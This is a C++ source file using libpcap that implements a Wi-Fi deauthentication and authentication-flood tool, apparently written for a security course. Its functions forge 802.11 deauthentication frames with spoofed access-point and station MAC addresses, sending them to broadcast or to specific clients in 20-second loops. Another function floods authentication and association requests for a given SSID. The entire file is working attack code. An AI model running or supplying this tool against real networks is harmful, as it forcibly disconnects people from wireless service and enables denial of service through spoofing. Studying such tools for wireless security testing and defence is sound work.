#include "packet.h"

void ApBroadcast(pcap_t* handle, char* apMac){
    //Ap -> BroadCast 0xc000
    uint8_t send[6];
    uint8_t des[6];
    std::istringstream apMacStream(apMac);
    int value;
    char colon;

    for (int i = 0; i < 6; ++i) {
        apMacStream >> std::hex >> value >> colon;
        send[i] = static_cast<uint8_t>(value);
    }

    struct Deauth packet;

    packet.deauth.frame_control = 0x00c0;
    
    for(int i = 0;i<6;i++){
        packet.deauth.des[i] = 0xff;
    }

    for(int i = 0;i<6;i++){
        packet.deauth.sourceaddr4[i] = send[i]; 
        packet.deauth.bssid[i] = send[i];
    }

    packet.fixed.ReasonCode = 0x0007;
    auto start = std::chrono::steady_clock::now();
    auto end = start;
    do {
        if(pcap_sendpacket(handle, (const u_char *)&packet, sizeof(packet)) != 0) {
            fprintf(stderr, "\n패킷 전송 실패: %s\n", pcap_geterr(handle));
        }
        fprintf(stderr,"send\n");
        end = std::chrono::steady_clock::now();
    } while(std::chrono::duration_cast<std::chrono::seconds>(end - start).count() < 20);
}

void APUnicast(pcap_t* handle, char* apMac, char* stationMac){
    //Ap -> Station
    uint8_t send[6];
    uint8_t des[6];
    std::istringstream apMacStream(apMac);
    std::istringstream stationMacStream(stationMac);
    int value;
    char colon;

    for (int i = 0; i < 6; ++i) {
        apMacStream >> std::hex >> value >> colon;
        send[i] = static_cast<uint8_t>(value);
    }

    value = 0;
    colon = 0;

    for (int i = 0; i < 6; ++i) {
        stationMacStream >> std::hex >> value >> colon;
        des[i] = static_cast<uint8_t>(value);
    }

    struct Deauth packet;
    packet.deauth.frame_control = 0x00c0;
    
    for(int i = 0;i<6;i++){
        packet.deauth.des[i] = des[i];
        packet.deauth.bssid[i] = send[i];
        packet.deauth.sourceaddr4[i] = send[i];
    }

    packet.fixed.ReasonCode = 0x0007;

    auto start = std::chrono::steady_clock::now();
    auto end = start;
    do {
        if(pcap_sendpacket(handle, (const u_char *)&packet, sizeof(packet)) != 0) {
            fprintf(stderr, "\n패킷 전송 실패: %s\n", pcap_geterr(handle));
        }
        fprintf(stderr,"send\n");
        end = std::chrono::steady_clock::now();
    } while(std::chrono::duration_cast<std::chrono::seconds>(end - start).count() < 20);
}

void StationUnicast(pcap_t* handle, char* apMac, char* stationMac){
    //Station -> AP
    uint8_t send[6];
    uint8_t des[6];
    std::istringstream apMacStream(apMac);
    std::istringstream stationMacStream(stationMac);
    int value;
    char colon;

    for (int i = 0; i < 6; ++i) {
        apMacStream >> std::hex >> value >> colon;
        des[i] = static_cast<uint8_t>(value);
    }

    value = 0;
    colon = 0;

    for (int i = 0; i < 6; ++i) {
        stationMacStream >> std::hex >> value >> colon;
        send[i] = static_cast<uint8_t>(value);
    }

    struct Deauth packet;

    packet.deauth.frame_control = 0x00c0;
    
    for(int i = 0;i<6;i++){
        packet.deauth.des[i] = des[i];
        packet.deauth.sourceaddr4[i] = send[i];
        packet.deauth.bssid[i] = des[i];
    }

    packet.fixed.ReasonCode = 0x0007;

    auto start = std::chrono::steady_clock::now();
    auto end = start;
    do {
        if(pcap_sendpacket(handle, (const u_char *)&packet, sizeof(packet)) != 0) {
            fprintf(stderr, "\n패킷 전송 실패: %s\n", pcap_geterr(handle));
        }
        fprintf(stderr,"send\n");
        end = std::chrono::steady_clock::now();
    } while(std::chrono::duration_cast<std::chrono::seconds>(end - start).count() < 20);
}

void authentication(pcap_t* handle, char* apMac, char* stationMac,char* ssid){
    //Station -> AP
    uint8_t send[6];
    uint8_t des[6];
    std::istringstream apMacStream(apMac);
    std::istringstream stationMacStream(stationMac);
    int value;
    char colon;

    for (int i = 0; i < 6; ++i) {
        apMacStream >> std::hex >> value >> colon;
        des[i] = static_cast<uint8_t>(value);
    }

    value = 0;
    colon = 0;

    for (int i = 0; i < 6; ++i) {
        stationMacStream >> std::hex >> value >> colon;
        send[i] = static_cast<uint8_t>(value);
    }

    struct Auth packet;
    struct Asso assopacket;
    
    
    packet.deauth.frame_control = 0xb0;
    assopacket.deauth.frame_control = 0x00;
    
    for(int i = 0;i<6;i++){
        packet.deauth.des[i] = des[i];
        packet.deauth.sourceaddr4[i] = send[i];
        packet.deauth.bssid[i] = des[i];

        assopacket.deauth.des[i] = des[i];
        assopacket.deauth.sourceaddr4[i] = send[i]; 
        assopacket.deauth.bssid[i] = des[i];
    }

    size_t ssidLength = strlen(ssid);
    assopacket.data.length = ssidLength;
    std::vector<uint8_t> assoPacketData(sizeof(assopacket) + ssidLength);

    memcpy(assoPacketData.data(), &assopacket, sizeof(assopacket));
    memcpy(assoPacketData.data() + sizeof(assopacket), ssid, ssidLength);

    auto start = std::chrono::steady_clock::now();
    auto end = start;
    do {
        if (pcap_sendpacket(handle, (const u_char *)&packet, sizeof(packet)) != 0) {
            fprintf(stderr, "\n패킷 전송 실패: %s\n", pcap_geterr(handle));
        }

        if (pcap_sendpacket(handle, assoPacketData.data(), assoPacketData.size()) != 0) {
            fprintf(stderr, "\n패킷 전송 실패: %s\n", pcap_geterr(handle));
        }

        fprintf(stderr, "send\n");
        end = std::chrono::steady_clock::now();
    } while (std::chrono::duration_cast<std::chrono::seconds>(end - start).count() < 20);
}

int main(int argc, char* argv[]){
    char errbuf[PCAP_ERRBUF_SIZE];

    pcap_t* handle = pcap_open_live(argv[1], BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        std::cerr << "network interface '" << argv[1] << "' is down: " << errbuf << std::endl;
        return 1;
    }
    printf("%d\n",argc);
    switch (argc) {
        case 3:
            ApBroadcast(handle, argv[2]);
            break;
        case 4:
            APUnicast(handle, argv[2], argv[3]);
            StationUnicast(handle, argv[2], argv[3]);
            break;
        case 6:
            authentication(handle, argv[2], argv[3],argv[5]);
            break;
        default:
            usage();
            break;
    }

    pcap_close(handle);
    return 0;
}
